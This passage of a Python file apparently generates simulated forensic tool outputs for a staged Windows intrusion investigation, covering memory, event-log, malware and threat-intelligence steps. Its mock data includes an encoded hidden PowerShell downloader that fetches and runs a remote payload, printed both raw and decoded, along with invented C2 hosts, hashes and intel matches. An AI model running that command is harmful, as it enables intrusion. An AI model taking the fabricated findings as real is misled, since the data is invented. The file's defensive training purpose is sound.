                    {"type": "process", "value": "rundll32.exe (PID 5678)", "confidence": 0.9, "context": "Part of suspected attack chain", "mitre_techniques": ["T1218.011"], "threat_score": 0.85},
                ],
                "mitre_techniques": [
                    {"tactic": "Execution", "technique_id": "T1059.001", "technique_name": "PowerShell", "confidence": 0.85},
                    {"tactic": "Defense Evasion", "technique_id": "T1218.011", "technique_name": "Rundll32", "confidence": 0.9},
                ],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:32:15Z", "event": "Suspicious PowerShell spawned from svchost.exe", "severity": "high"},
                    {"timestamp": "2024-01-15T14:34:01Z", "event": "Rundll32 execution via cmd.exe", "severity": "critical"},
                ],
                "next_step_reasoning": "Process tree shows suspicious parent-child relationships. Need to examine command line arguments to understand what PowerShell and rundll32 were executing.",
            },
            "volatility_pstree": {
                "thought": "Process relationships reveal attack chain progression. A tree view will show how the attacker moved through processes.",
                "action": "Generate process tree to visualize parent-child relationships and identify process injection or suspicious spawning patterns.",
                "input": {
                    "source": "artifact",
                    "plugin": "windows.pstree",
                },
                "output": {
                    "raw": "System (4)\n└─ smss.exe (456)\n   └─ svchost.exe (7832)\n      └─ powershell.exe (2184) [SUSPICIOUS]\n         └─ cmd.exe (3344)\n            └─ rundll32.exe (5678) [SUSPICIOUS]",
                    "parsed": {
                        "attack_chain": ["svchost.exe", "powershell.exe", "cmd.exe", "rundll32.exe"],
                        "depth": 4,
                        "pivot_point": "svchost.exe (PID 7832)",
                    },
                },
                "evidence": [
                    {"type": "attack_chain", "value": "svchost.exe -> powershell.exe -> cmd.exe -> rundll32.exe", "confidence": 0.92, "context": "Complete attack chain identified", "mitre_techniques": ["T1059.001", "T1218.011"], "threat_score": 0.9},
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Attack chain clearly shows lateral movement from svchost to payload execution. Command line analysis will reveal exact commands executed.",
            },
            "volatility_cmdline": {
                "thought": "Command line arguments reveal attacker intentions and payload details. This is critical for understanding what the malware actually did.",
                "action": "Extract command line arguments for all suspicious processes to identify malicious commands and encoded payloads.",
                "input": {
                    "source": "previous_step",
                    "suspicious_pids": [2184, 3344, 5678],
                    "plugin": "windows.cmdline",
                },
                "output": {
                    "raw": "powershell.exe (2184): powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA\ncmd.exe (3344): cmd.exe /c whoami && ipconfig /all\nrundll32.exe (5678): rundll32.exe C:\\Users\\Public\\update.dll,DllMain",
                    "parsed": {
                        "decoded_powershell": "IEX (New-Object Net.WebClient).downloadstring('http://192.168.1.100/payload.ps1')",
                        "c2_url": "http://192.168.1.100/payload.ps1",
                        "reconnaissance_commands": ["whoami", "ipconfig /all"],
                        "malicious_dll": "C:\\Users\\Public\\update.dll",
                    },
                },
                "evidence": [
                    {"type": "command", "value": "powershell.exe -enc [Base64 encoded downloader]", "confidence": 0.95, "context": "Encoded PowerShell downloader detected", "mitre_techniques": ["T1059.001", "T1027"], "threat_score": 0.95},
                    {"type": "ip", "value": "192.168.1.100", "confidence": 0.95, "context": "C2 server in PowerShell payload", "mitre_techniques": ["T1071.001"], "threat_score": 0.9},
                    {"type": "url", "value": "http://192.168.1.100/payload.ps1", "confidence": 0.95, "context": "Payload download URL", "mitre_techniques": ["T1105"], "threat_score": 0.92},
                    {"type": "file", "value": "C:\\Users\\Public\\update.dll", "confidence": 0.9, "context": "Suspicious DLL in Public folder", "mitre_techniques": ["T1218.011"], "threat_score": 0.88},
                ],
                "mitre_techniques": [
                    {"tactic": "Defense Evasion", "technique_id": "T1027", "technique_name": "Obfuscated Files or Information", "confidence": 0.95},
                    {"tactic": "Command and Control", "technique_id": "T1071.001", "technique_name": "Web Protocols", "confidence": 0.9},
                    {"tactic": "Command and Control", "technique_id": "T1105", "technique_name": "Ingress Tool Transfer", "confidence": 0.92},
                ],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:32:15Z", "event": "Encoded PowerShell downloader executed", "severity": "critical"},
                    {"timestamp": "2024-01-15T14:33:42Z", "event": "Reconnaissance commands executed (whoami, ipconfig)", "severity": "medium"},
                    {"timestamp": "2024-01-15T14:34:01Z", "event": "Malicious DLL loaded via rundll32", "severity": "critical"},
                ],
                "next_step_reasoning": "Identified C2 IP and malicious payload URL. Need to scan for injected code and validate network connections to the C2 server.",
            },
            "volatility_malfind": {
                "thought": "Need to detect injected code in process memory. Malfind identifies memory regions with suspicious characteristics like RWX permissions without corresponding file mappings.",
                "action": "Scan all process memory for potentially injected code using VAD analysis and PE header detection.",
                "input": {
                    "source": "artifact",
                    "plugin": "windows.malfind",
                },
                "output": {
                    "raw": "Process: svchost.exe (7832)\nVAD: 0x7ff600000000-0x7ff600001000 Protection: PAGE_EXECUTE_READWRITE\nHexdump:\n0x7ff600000000  4d 5a 90 00 03 00 00 00  MZ......\n0x7ff600000008  04 00 00 00 ff ff 00 00  ........",
                    "parsed": {
                        "injected_processes": [
                            {
                                "process": "svchost.exe",
                                "pid": 7832,
                                "address": "0x7ff600000000",
                                "size": 4096,
                                "protection": "PAGE_EXECUTE_READWRITE",
                                "indicators": ["MZ header", "RWX memory", "No file backing"],
                            }
                        ],
                        "total_injections": 1,
                    },
                },
                "evidence": [
                    {"type": "injection", "value": "Code injection in svchost.exe (PID 7832) at 0x7ff600000000", "confidence": 0.95, "context": "MZ header found in RWX memory without file backing", "mitre_techniques": ["T1055"], "threat_score": 0.95},
                ],
                "mitre_techniques": [
                    {"tactic": "Defense Evasion", "technique_id": "T1055", "technique_name": "Process Injection", "confidence": 0.95},
                    {"tactic": "Privilege Escalation", "technique_id": "T1055", "technique_name": "Process Injection", "confidence": 0.95},
                ],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:31:00Z", "event": "Process injection detected in svchost.exe", "severity": "critical"},
                ],
                "next_step_reasoning": "Confirmed process injection in svchost.exe. This explains the suspicious child processes. Need to examine network connections to identify C2 communication.",
            },
            "volatility_netscan": {
                "thought": "Network connections reveal C2 communication channels. Combined with the identified C2 IP from command line, we can confirm active beaconing.",
                "action": "Scan memory for network connections, listening ports, and socket information.",
                "input": {
                    "source": "artifact",
                    "plugin": "windows.netstat",
                },
                "output": {
                    "raw": "Proto  Local Address          Foreign Address        State          PID    Owner\nTCP    10.0.0.50:49721        192.168.1.100:443      ESTABLISHED    7832   svchost.exe\nTCP    10.0.0.50:49722        185.220.101.45:8443    ESTABLISHED    5678   rundll32.exe\nTCP    10.0.0.50:445          0.0.0.0:0              LISTENING      4      System",
                    "parsed": {
                        "suspicious_connections": [
                            {"local": "10.0.0.50:49721", "remote": "192.168.1.100:443", "state": "ESTABLISHED", "pid": 7832, "process": "svchost.exe"},
                            {"local": "10.0.0.50:49722", "remote": "185.220.101.45:8443", "state": "ESTABLISHED", "pid": 5678, "process": "rundll32.exe"},
                        ],
                        "c2_confirmed": True,
                    },
                },
                "evidence": [
                    {"type": "ip", "value": "192.168.1.100", "confidence": 0.95, "context": "C2 server confirmed - active connection from injected svchost.exe", "mitre_techniques": ["T1071.001"], "threat_score": 0.95},
                    {"type": "ip", "value": "185.220.101.45", "confidence": 0.9, "context": "Secondary C2 server on port 8443", "mitre_techniques": ["T1071.001", "T1571"], "threat_score": 0.92},
                    {"type": "network", "value": "Connection to 185.220.101.45:8443 from rundll32.exe", "confidence": 0.9, "context": "Non-standard port for C2", "mitre_techniques": ["T1571"], "threat_score": 0.88},
                ],
                "mitre_techniques": [
                    {"tactic": "Command and Control", "technique_id": "T1571", "technique_name": "Non-Standard Port", "confidence": 0.9},
                ],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:35:00Z", "event": "C2 connection established to 192.168.1.100:443", "severity": "critical"},
                    {"timestamp": "2024-01-15T14:36:00Z", "event": "Secondary C2 connection to 185.220.101.45:8443", "severity": "critical"},
                ],
                "next_step_reasoning": "Confirmed two C2 channels. Need to enrich these IPs with threat intelligence to identify threat actor or malware family.",
            },
            "volatility_dlllist": {
                "thought": "Examining loaded DLLs helps identify suspicious modules and potential DLL side-loading attacks.",
                "action": "List all loaded DLLs for suspicious processes to identify anomalies.",
                "input": {
                    "source": "previous_step",
                    "pids": [2184, 5678, 7832],
                    "plugin": "windows.dlllist",
                },
                "output": {
                    "raw": "rundll32.exe (5678):\nBase             Size      Name\n0x7ff600000000   0x1000    update.dll [SUSPICIOUS - No digital signature]\n0x7ff800000000   0x10000   kernel32.dll",
                    "parsed": {
                        "suspicious_dlls": [
                            {"name": "update.dll", "path": "C:\\Users\\Public\\update.dll", "base": "0x7ff600000000", "size": 4096, "signed": False},
                        ],
                    },
                },
                "evidence": [
                    {"type": "file", "value": "update.dll (unsigned, loaded in rundll32)", "confidence": 0.9, "context": "Suspicious unsigned DLL in Public folder", "mitre_techniques": ["T1574.002"], "threat_score": 0.88},
                ],
                "mitre_techniques": [
                    {"tactic": "Persistence", "technique_id": "T1574.002", "technique_name": "DLL Side-Loading", "confidence": 0.85},
                ],
                "timeline_events": [],
                "next_step_reasoning": "Identified unsigned malicious DLL. String extraction and YARA scanning needed to identify malware family.",
            },
            "volatility_handles": {
                "thought": "Handle analysis reveals files, registry keys, and mutexes accessed by malicious processes - key for understanding persistence and lateral movement.",
                "action": "Enumerate handles for suspicious processes to find accessed resources.",
                "input": {
                    "source": "previous_step",
                    "pids": [2184, 7832],
                    "plugin": "windows.handles",
                },
                "output": {
                    "raw": "PID    Type     Handle  Name\n2184   Mutant   0x1a4   \\BaseNamedObjects\\Global\\MALWARE_MUTEX_X9K2\n7832   Key      0x2b0   \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "parsed": {
                        "mutex": "Global\\MALWARE_MUTEX_X9K2",
                        "registry_persistence": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    },
                },
                "evidence": [
                    {"type": "mutex", "value": "Global\\MALWARE_MUTEX_X9K2", "confidence": 0.95, "context": "Known malware mutex pattern", "mitre_techniques": [], "threat_score": 0.85},
                    {"type": "registry", "value": "HKLM\\...\\CurrentVersion\\Run", "confidence": 0.9, "context": "Persistence registry key accessed", "mitre_techniques": ["T1547.001"], "threat_score": 0.88},
                ],
                "mitre_techniques": [
                    {"tactic": "Persistence", "technique_id": "T1547.001", "technique_name": "Registry Run Keys", "confidence": 0.9},
                ],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:35:30Z", "event": "Persistence mechanism installed via Run key", "severity": "high"},
                ],
                "next_step_reasoning": "Found persistence mechanism and unique mutex. Mutex can be used as IOC signature.",
            },
        }
        return outputs.get(tool_id, self._generate_generic_output(tool_id, prev_evidence))

    def _generate_windows_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate Windows forensics tool output."""
        outputs = {
            "chainsaw": {
                "thought": "Chainsaw enables rapid hunting through Windows Event Logs using Sigma rules. This will identify known attack patterns efficiently.",
                "action": "Execute Chainsaw hunt with comprehensive Sigma rules against EVTX files to detect malicious activity patterns.",
                "input": {
                    "source": "artifact",
                    "evtx_directory": "./logs/",
                    "rules": "sigma/rules/",
                    "parameters": "--json --full",
                },
                "output": {
                    "raw": '[{"timestamp":"2024-01-15T14:32:15Z","detection":"Suspicious PowerShell Execution","level":"high","event_id":4104},{"timestamp":"2024-01-15T14:33:42Z","detection":"Potential Credential Dumping","level":"critical","event_id":4656}]',
                    "parsed": {
                        "total_detections": 12,
                        "critical": 3,
                        "high": 5,
                        "medium": 4,
                        "detections": [
                            {"rule": "Suspicious PowerShell Execution", "level": "high", "event_id": 4104, "count": 3},
                            {"rule": "Potential Credential Dumping", "level": "critical", "event_id": 4656, "count": 1},
                            {"rule": "Suspicious Service Installation", "level": "high", "event_id": 7045, "count": 2},
                        ],
                    },
                },
                "evidence": [
                    {"type": "detection", "value": "Suspicious PowerShell Execution (Event 4104)", "confidence": 0.9, "context": "Sigma rule match - encoded command execution", "mitre_techniques": ["T1059.001"], "threat_score": 0.85},
                    {"type": "detection", "value": "Potential Credential Dumping (Event 4656)", "confidence": 0.95, "context": "LSASS access detected", "mitre_techniques": ["T1003.001"], "threat_score": 0.95},
                    {"type": "detection", "value": "Suspicious Service Installation (Event 7045)", "confidence": 0.85, "context": "New service with suspicious characteristics", "mitre_techniques": ["T1543.003"], "threat_score": 0.8},
                ],
                "mitre_techniques": [
                    {"tactic": "Credential Access", "technique_id": "T1003.001", "technique_name": "LSASS Memory", "confidence": 0.95},
                    {"tactic": "Persistence", "technique_id": "T1543.003", "technique_name": "Windows Service", "confidence": 0.85},
                ],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:32:15Z", "event": "Suspicious PowerShell execution detected", "severity": "high"},
                    {"timestamp": "2024-01-15T14:33:42Z", "event": "Credential dumping attempt (LSASS access)", "severity": "critical"},
                    {"timestamp": "2024-01-15T14:40:00Z", "event": "Suspicious service installed for persistence", "severity": "high"},
                ],
                "next_step_reasoning": "Multiple high-severity detections found. Hayabusa timeline will provide detailed event sequence for attack reconstruction.",
            },
            "hayabusa": {
                "thought": "Hayabusa provides fast timeline generation with detection rules. Combined with Chainsaw hits, this creates a comprehensive view of the attack progression.",
                "action": "Generate CSV timeline with Hayabusa using all detection rules for complete attack visibility.",
                "input": {
                    "source": "artifact",
                    "evtx_directory": "./logs/",
                    "command": "csv-timeline",
                    "parameters": "-o timeline.csv -p verbose",
                },
                "output": {
                    "raw": "Timestamp,RuleTitle,Level,EventID,Channel\n2024-01-15 14:30:00,Logon Success,info,4624,Security\n2024-01-15 14:32:15,Encoded PowerShell,high,4104,PowerShell\n2024-01-15 14:33:42,LSASS Access,critical,4656,Security",
                    "parsed": {
                        "total_events": 847,
                        "timeline_start": "2024-01-15T14:00:00Z",
                        "timeline_end": "2024-01-15T16:00:00Z",
                        "attack_window": "2024-01-15T14:30:00Z to 2024-01-15T14:45:00Z",
                        "key_events": [
                            {"time": "14:30:00", "event": "Initial logon (Event 4624)"},
                            {"time": "14:32:15", "event": "PowerShell execution begins"},
                            {"time": "14:33:42", "event": "Credential access attempt"},
                            {"time": "14:40:00", "event": "Persistence established"},
                        ],
                    },
                },
                "evidence": [
                    {"type": "timeline", "value": "Attack window: 14:30 - 14:45 (15 minutes)", "confidence": 0.95, "context": "Concentrated malicious activity", "mitre_techniques": [], "threat_score": 0.9},
                ],
                "mitre_techniques": [],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:30:00Z", "event": "Initial access - User logon", "severity": "info"},
                ],
                "next_step_reasoning": "Timeline confirms 15-minute attack window. Need to check Windows Prefetch for additional execution evidence.",
            },
            "evtxecmd": {
                "thought": "EvtxECmd (Eric Zimmerman) provides deep EVTX parsing with Maps for field extraction. Essential for detailed event analysis.",
                "action": "Parse Event Logs with EvtxECmd using Maps for structured field extraction.",
                "input": {
                    "source": "artifact",
                    "evtx_directory": "./logs/",
                    "parameters": "-d . --csv output/ --csvf events.csv",
                },
                "output": {
                    "raw": "Processed 15 EVTX files, 23847 total events, 156 events with maps applied",
                    "parsed": {
                        "files_processed": 15,
                        "total_events": 23847,
                        "mapped_events": 156,
                    },
                },
                "evidence": [],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Events parsed successfully. Combined with Chainsaw/Hayabusa results provides complete EVTX analysis.",
            },
            "pecmd": {
                "thought": "Prefetch files reveal program execution history - even deleted executables leave traces. Critical for identifying executed malware.",
                "action": "Analyze Prefetch files to identify program execution history and discover additional executed malware.",
                "input": {
                    "source": "artifact",
                    "prefetch_directory": "C:\\Windows\\Prefetch\\",
                    "parameters": "-d . --csv output/prefetch.csv",
                },
                "output": {
                    "raw": "POWERSHELL.EXE-A123.pf: Last Run: 2024-01-15 14:32:15, Run Count: 5\nRUNDLL32.EXE-B456.pf: Last Run: 2024-01-15 14:34:01, Run Count: 1\nCMD.EXE-C789.pf: Last Run: 2024-01-15 14:33:42, Run Count: 3",
                    "parsed": {
                        "suspicious_executions": [
                            {"executable": "POWERSHELL.EXE", "last_run": "2024-01-15 14:32:15", "run_count": 5},
                            {"executable": "RUNDLL32.EXE", "last_run": "2024-01-15 14:34:01", "run_count": 1},
                        ],
                    },
                },
                "evidence": [
                    {"type": "execution", "value": "PowerShell executed 5 times on attack day", "confidence": 0.9, "context": "Prefetch confirms execution history", "mitre_techniques": ["T1059.001"], "threat_score": 0.8},
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Prefetch confirms execution times match memory analysis. Registry analysis needed for persistence mechanisms.",
            },
            "recmd": {
                "thought": "Registry contains persistence mechanisms, configuration data, and forensic artifacts. RECmd enables comprehensive registry analysis.",
                "action": "Analyze Registry hives for persistence mechanisms and configuration artifacts.",
                "input": {
                    "source": "artifact",
                    "registry_hives": ["SYSTEM", "SOFTWARE", "NTUSER.DAT"],
                    "parameters": "-d . --bn BatchExamples\\RECmd_Batch.reb --csv output/",
                },
                "output": {
                    "raw": "Run Key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService = C:\\Users\\Public\\update.dll\nService: MaliciousService, ImagePath: C:\\Windows\\Temp\\svc.exe",
                    "parsed": {
                        "persistence_mechanisms": [
                            {"type": "Run Key", "key": "HKLM\\...\\Run\\UpdateService", "value": "C:\\Users\\Public\\update.dll"},
                            {"type": "Service", "name": "MaliciousService", "path": "C:\\Windows\\Temp\\svc.exe"},
                        ],
                    },
                },
                "evidence": [
                    {"type": "registry", "value": "Run key persistence: UpdateService -> update.dll", "confidence": 0.95, "context": "Malicious Run key for persistence", "mitre_techniques": ["T1547.001"], "threat_score": 0.9},
                    {"type": "service", "value": "MaliciousService at C:\\Windows\\Temp\\svc.exe", "confidence": 0.9, "context": "Suspicious service in Temp folder", "mitre_techniques": ["T1543.003"], "threat_score": 0.88},
                ],
                "mitre_techniques": [
                    {"tactic": "Persistence", "technique_id": "T1547.001", "technique_name": "Registry Run Keys", "confidence": 0.95},
                    {"tactic": "Persistence", "technique_id": "T1543.003", "technique_name": "Windows Service", "confidence": 0.9},
                ],
                "timeline_events": [
                    {"timestamp": "2024-01-15T14:36:00Z", "event": "Registry Run key persistence installed", "severity": "high"},
                    {"timestamp": "2024-01-15T14:38:00Z", "event": "Malicious Windows service created", "severity": "high"},
                ],
                "next_step_reasoning": "Multiple persistence mechanisms confirmed. Threat intelligence enrichment will help identify the malware family.",
            },
        }
        return outputs.get(tool_id, self._generate_generic_output(tool_id, prev_evidence))

    def _generate_malware_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate malware analysis tool output."""
        outputs = {
            "strings": {
                "thought": "String extraction reveals embedded URLs, IPs, commands, and error messages that indicate malware functionality and C2 infrastructure.",
                "action": "Extract readable strings from the artifact with minimum length filtering to find IOCs and malware indicators.",
                "input": {
                    "source": "artifact",
                    "parameters": "-n 8 -a",
                    "description": "Extract ASCII and Unicode strings minimum 8 characters",
                },
                "output": {
                    "raw": "http://192.168.1.100/payload.ps1\nhttps://evil-domain.com/beacon\nC:\\Users\\Public\\update.dll\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\ncmd.exe /c whoami\nMimikatz\nCobalStrike",
                    "parsed": {
                        "urls": ["http://192.168.1.100/payload.ps1", "https://evil-domain.com/beacon"],
                        "ips": ["192.168.1.100"],
                        "domains": ["evil-domain.com"],
                        "paths": ["C:\\Users\\Public\\update.dll"],
                        "commands": ["cmd.exe /c whoami"],
                        "keywords": ["Mimikatz", "CobaltStrike"],
                        "registry_keys": ["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"],
                    },
                },
                "evidence": [
                    {"type": "url", "value": "http://192.168.1.100/payload.ps1", "confidence": 0.9, "context": "Payload download URL", "mitre_techniques": ["T1105"], "threat_score": 0.85},
                    {"type": "domain", "value": "evil-domain.com", "confidence": 0.85, "context": "C2 beacon domain", "mitre_techniques": ["T1071.001"], "threat_score": 0.88},
                    {"type": "keyword", "value": "CobaltStrike", "confidence": 0.9, "context": "Known C2 framework reference", "mitre_techniques": ["T1219"], "threat_score": 0.92},
                    {"type": "keyword", "value": "Mimikatz", "confidence": 0.95, "context": "Credential theft tool reference", "mitre_techniques": ["T1003"], "threat_score": 0.95},
                ],
                "mitre_techniques": [
                    {"tactic": "Command and Control", "technique_id": "T1219", "technique_name": "Remote Access Software", "confidence": 0.9},
                    {"tactic": "Credential Access", "technique_id": "T1003", "technique_name": "OS Credential Dumping", "confidence": 0.95},
                ],
                "timeline_events": [],
                "next_step_reasoning": "Strings reveal Cobalt Strike and Mimikatz references. YARA scanning will confirm malware family identification.",
            },
            "yara": {
                "thought": "YARA rules provide pattern-based malware detection. Running community and custom rules will identify the malware family.",
                "action": "Execute YARA scan with comprehensive rule set including APT, ransomware, and commodity malware signatures.",
                "input": {
                    "source": "artifact",
                    "rules_directory": "/rules/yara/",
                    "parameters": "-s -w",
                },
                "output": {
                    "raw": "CobaltStrike_Beacon_x64 matched at offset 0x1a40\nMimikatz_Memory_Signature matched at offset 0x8f00\nEmotet_Unpacked matched at offset 0x2200",
                    "parsed": {
                        "matches": [
                            {"rule": "CobaltStrike_Beacon_x64", "offset": "0x1a40", "confidence": 0.95},
                            {"rule": "Mimikatz_Memory_Signature", "offset": "0x8f00", "confidence": 0.9},
                            {"rule": "Emotet_Unpacked", "offset": "0x2200", "confidence": 0.85},
                        ],
                        "malware_families": ["CobaltStrike", "Mimikatz", "Emotet"],
                    },
                },
                "evidence": [
                    {"type": "malware", "value": "Cobalt Strike Beacon detected", "confidence": 0.95, "context": "YARA rule CobaltStrike_Beacon_x64 matched", "mitre_techniques": ["T1219"], "threat_score": 0.95},
                    {"type": "malware", "value": "Mimikatz signatures detected", "confidence": 0.9, "context": "Credential theft tool in memory", "mitre_techniques": ["T1003.001"], "threat_score": 0.92},
                    {"type": "malware", "value": "Emotet unpacked payload", "confidence": 0.85, "context": "Initial access malware identified", "mitre_techniques": ["T1566.001"], "threat_score": 0.88},
                ],
                "mitre_techniques": [
                    {"tactic": "Initial Access", "technique_id": "T1566.001", "technique_name": "Spearphishing Attachment", "confidence": 0.85},
                ],
                "timeline_events": [],
                "next_step_reasoning": "YARA confirms Cobalt Strike, Mimikatz, and Emotet. This suggests a multi-stage attack: Emotet for initial access, CS for C2, Mimikatz for credentials.",
            },
            "pe_analysis": {
                "thought": "PE analysis reveals binary characteristics like compile time, imports, and section anomalies that help identify malware behavior and origin.",
                "action": "Analyze PE structure including headers, imports, exports, and section characteristics.",
                "input": {
                    "source": "artifact",
                    "file": "update.dll",
                },
                "output": {
                    "raw": "PE Analysis:\nCompile Time: 2024-01-10 08:15:00 UTC\nImphash: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\nSections: .text (RWX), .data, .rsrc\nImports: kernel32.dll, ws2_32.dll, advapi32.dll",
                    "parsed": {
                        "compile_time": "2024-01-10T08:15:00Z",
                        "imphash": "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
                        "suspicious_sections": [".text with RWX permissions"],
                        "network_imports": ["ws2_32.dll - socket, connect, send, recv"],
                        "crypto_imports": ["advapi32.dll - CryptEncrypt, CryptDecrypt"],
                        "anomalies": ["RWX section", "Recent compile time", "Network + Crypto imports"],
                    },
                },
                "evidence": [
                    {"type": "hash", "value": "Imphash: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6", "confidence": 0.9, "context": "Import hash for malware family tracking", "mitre_techniques": [], "threat_score": 0.7},
                    {"type": "anomaly", "value": ".text section with RWX permissions", "confidence": 0.85, "context": "Indicates packed or self-modifying code", "mitre_techniques": ["T1027.002"], "threat_score": 0.8},
                ],
                "mitre_techniques": [
                    {"tactic": "Defense Evasion", "technique_id": "T1027.002", "technique_name": "Software Packing", "confidence": 0.85},
                ],
                "timeline_events": [],
                "next_step_reasoning": "PE analysis shows suspicious characteristics. FLOSS for advanced string extraction to find obfuscated strings.",
            },
            "floss": {
                "thought": "FLOSS extracts obfuscated strings that regular strings command misses. Essential for packed/crypted malware.",
                "action": "Run FLOSS to extract deobfuscated strings including stack strings and decoded strings.",
                "input": {
                    "source": "artifact",
                    "parameters": "--no-static-strings",
                },
                "output": {
                    "raw": "Decoded strings:\nhttp://c2.evil-domain.com/gate.php\nBeacon_x64.dll\nPOST /submit.php HTTP/1.1\nUser-Agent: Mozilla/5.0 CobaltStrike",
                    "parsed": {
                        "deobfuscated_urls": ["http://c2.evil-domain.com/gate.php"],
                        "c2_uri": "/submit.php",
                        "user_agent": "Mozilla/5.0 CobaltStrike",
                        "beacon_config": "Beacon_x64.dll",
                    },
                },
                "evidence": [
                    {"type": "url", "value": "http://c2.evil-domain.com/gate.php", "confidence": 0.95, "context": "Deobfuscated C2 URL", "mitre_techniques": ["T1071.001"], "threat_score": 0.92},
                    {"type": "domain", "value": "c2.evil-domain.com", "confidence": 0.95, "context": "C2 domain from deobfuscated strings", "mitre_techniques": ["T1071.001"], "threat_score": 0.9},
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "FLOSS revealed additional C2 domain. All IOCs should now be enriched with threat intelligence.",
            },
            "yara_ai": {
                "thought": "AI-generated YARA rules can identify novel malware variants by analyzing unique patterns in the sample.",
                "action": "Generate custom YARA rule from sample using AI analysis.",
                "input": {
                    "source": "artifact",
                    "file": "update.dll",
                },
                "output": {
                    "raw": "rule Generated_Malware_Rule {\n    meta:\n        description = \"AI-generated rule for update.dll\"\n    strings:\n        $s1 = \"gate.php\"\n        $s2 = {4D 5A 90 00}\n    condition:\n        all of them\n}",
                    "parsed": {
                        "rule_name": "Generated_Malware_Rule",
                        "strings_identified": 2,
                        "confidence": 0.85,
                    },
                },
                "evidence": [],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "AI-generated rule can be used for hunting similar samples. Proceed to threat intelligence enrichment.",
            },
            "elf_analysis": {
                "thought": "ELF analysis reveals Linux binary characteristics for malware targeting Linux systems.",
                "action": "Analyze ELF structure including sections, symbols, and linked libraries.",
                "input": {
                    "source": "artifact",
                },
                "output": {
                    "raw": "ELF 64-bit LSB executable, dynamically linked\nLibraries: libc.so.6, libcrypto.so\nSymbols: connect, send, recv, EVP_EncryptInit",
                    "parsed": {
                        "type": "ELF 64-bit",
                        "linking": "dynamic",
                        "suspicious_symbols": ["connect", "send", "recv", "EVP_EncryptInit"],
                    },
                },
                "evidence": [
                    {"type": "binary", "value": "ELF with network and crypto functions", "confidence": 0.8, "context": "Potential Linux backdoor", "mitre_techniques": ["T1059.004"], "threat_score": 0.75},
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "ELF analysis complete. Continue with other analysis tools.",
            },
        }
        return outputs.get(tool_id, self._generate_generic_output(tool_id, prev_evidence))

    def _generate_ti_output(self, tool_id: str, prev_evidence: List) -> Dict[str, Any]:
        """Generate threat intelligence tool output."""
        # Extract IOCs from previous evidence
        iocs = []
        for ev in prev_evidence:
            if ev.get("type") in ["ip", "domain", "hash", "url"]:
                iocs.append({"type": ev["type"], "value": ev["value"]})

        if not iocs:
            iocs = [
                {"type": "ip", "value": "192.168.1.100"},
                {"type": "ip", "value": "185.220.101.45"},
                {"type": "domain", "value": "evil-domain.com"},
            ]

        outputs = {
            "ioc_local": {
                "thought": "Local IOC database check provides instant results against known bad indicators from MalwareBazaar, Feodo Tracker, and URLhaus.",
                "action": "Query local threat databases for all extracted IOCs to identify known malicious infrastructure.",
                "input": {
                    "source": "previous_step",
                    "iocs": iocs,
                    "databases": ["malwarebazaar", "feodo_c2", "urlhaus"],
                },
                "output": {
                    "raw": "IP 185.220.101.45: FOUND in Feodo C2 tracker (Cobalt Strike)\nDomain evil-domain.com: FOUND in URLhaus (malware distribution)",
                    "parsed": {
                        "matches": [
                            {"ioc": "185.220.101.45", "database": "Feodo C2", "malware_family": "CobaltStrike", "tags": ["c2", "apt"]},
                            {"ioc": "evil-domain.com", "database": "URLhaus", "threat_type": "malware_distribution"},
                        ],
                        "not_found": ["192.168.1.100"],
                    },
                },
                "evidence": [
                    {"type": "threat_intel", "value": "185.220.101.45 - Known Cobalt Strike C2", "confidence": 0.98, "context": "Feodo Tracker C2 database match", "mitre_techniques": ["T1071.001", "T1219"], "threat_score": 0.98},
                    {"type": "threat_intel", "value": "evil-domain.com - Malware distribution", "confidence": 0.95, "context": "URLhaus database match", "mitre_techniques": ["T1105"], "threat_score": 0.9},
                ],
                "mitre_techniques": [],
                "timeline_events": [],
                "next_step_reasoning": "Local database confirmed Cobalt Strike C2. OTX lookup will provide additional context and related indicators.",
            },
            "ioc_otx": {
                "thought": "AlienVault OTX provides crowd-sourced threat intelligence including related IOCs, malware families, and threat actor attribution.",
                "action": "Query OTX API for enriched threat intelligence on confirmed malicious IOCs.",
                "input": {
                    "source": "previous_step",
                    "iocs": ["185.220.101.45", "evil-domain.com"],
                    "api": "OTX DirectConnect API",
                },
                "output": {
                    "raw": "IP 185.220.101.45:\n  Pulse Count: 47\n  Malware Families: CobaltStrike, Emotet\n  Country: RU\n  Tags: apt, c2, cobaltstrike",
                    "parsed": {
                        "185.220.101.45": {
                            "pulse_count": 47,
                            "malware_families": ["CobaltStrike", "Emotet"],
                            "country": "RU",
                            "tags": ["apt", "c2", "cobaltstrike"],
                            "related_iocs": ["evil-domain.com", "backdoor.exe"],
                        },
                    },
                },
                "evidence": [
